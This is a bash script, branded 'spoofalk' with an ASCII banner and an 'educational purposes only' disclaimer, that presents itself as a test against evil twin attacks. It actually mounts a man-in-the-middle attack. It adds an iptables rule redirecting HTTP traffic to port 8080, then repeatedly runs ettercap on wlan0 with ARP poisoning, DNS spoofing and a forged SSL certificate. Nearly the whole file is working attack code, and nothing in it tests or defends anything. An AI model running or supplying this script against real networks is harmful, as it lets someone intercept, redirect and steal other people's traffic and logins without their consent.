#!/bin/bash
####alk99###
echo "this script is for educational purposes only any use out of law we are not responsible";  sleep 1;

clear ;


echo -e "\e[92m";
echo "                          ___       _  _     ";
echo "                         / __)     | || |    ";
echo "  ___ ____   ___   ___ _| |__ _____| || |  _ ";
echo " /___)  _ \ / _ \ / _ (_   __|____ | || |_/ )";
echo "|___ | |_| | |_| | |_| || |  / ___ | ||  _ ( ";
echo "(___/|  __/ \___/ \___/ |_|  \_____|\_)_| \_)";
echo "     |_|                                     ";




echo "alk99 protect your nework against evil twin attack by testing it XD";

sleep 3;
printf "\n\n\n";
l=$1
if [ "$l" ] ; then
    echo "starting";
else
   l=1 ;
fi
cd spoofalk/ettercap ;
iptables -t nat -A PREROUTING -p        tcp --destination-port 80 -j REDIRECT --to-port 8080 ;
COUNTER=0;
while [  $COUNTER -lt $l ]; do
        echo The loop is $COUNTER
		sleep 0.1;
         let COUNTER=COUNTER+1 
         iptables -t nat -A PREROUTING -p        tcp --destination-port 80 -j REDIRECT --to-port 8080 ;
         ./ettercap -Tqi wlan0 -M arp:remote -P dns_spoof /// --certificate etter.ssl.crt ;
        echo "done";
 
 
 done ;
